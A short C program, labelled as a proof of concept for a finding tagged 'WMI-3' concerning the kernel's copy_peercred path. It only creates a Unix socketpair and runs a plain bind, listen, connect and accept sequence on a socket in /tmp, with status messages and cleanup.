/*
 * PoC for WMI-3: copy_peercred - AF_UNIX connect scenario
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>

#define SOCK_PATH "/tmp/poc_unix_sock"

int main(void)
{
    int sv[2], ret;
    struct sockaddr_un addr;
    int server_fd, client_fd, accepted_fd;
    
    /* Clean up any leftover socket file */
    unlink(SOCK_PATH);
    
    /* Use socketpair */
    printf("[*] Testing socketpair...\n");
    ret = socketpair(AF_UNIX, SOCK_STREAM, 0, sv);
    if (ret < 0) {
        perror("socketpair");
    } else {
        printf("[+] socketpair succeeded\n");
        close(sv[0]);
        close(sv[1]);
    }
    
    /* Create server, listen, connect */
    printf("[*] Testing basic connect...\n");
    
    server_fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("socket");
        return 1;
    }
    
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, SOCK_PATH, sizeof(addr.sun_path) - 1);
    
    ret = bind(server_fd, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0) {
        perror("bind");
        close(server_fd);
        return 1;
    }
    
    ret = listen(server_fd, 8);
    if (ret < 0) {
        perror("listen");
        close(server_fd);
        return 1;
    }
    printf("[+] Server listening on %s\n", SOCK_PATH);
    
    client_fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (client_fd < 0) {
        perror("client socket");
        close(server_fd);
        return 1;
    }
    
    ret = connect(client_fd, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0) {
        perror("connect");
        close(client_fd);
        close(server_fd);
        return 1;
    }
    printf("[+] Client connected\n");
    
    /* Accept on server side */
    accepted_fd = accept(server_fd, NULL, NULL);
    if (accepted_fd < 0) {
        perror("accept");
        close(client_fd);
        close(server_fd);
        return 1;
    }
    printf("[+] Server accepted connection\n");
    
    close(accepted_fd);
    close(client_fd);
    close(server_fd);
    unlink(SOCK_PATH);
    
    printf("[*] Done\n");
    return 0;
}
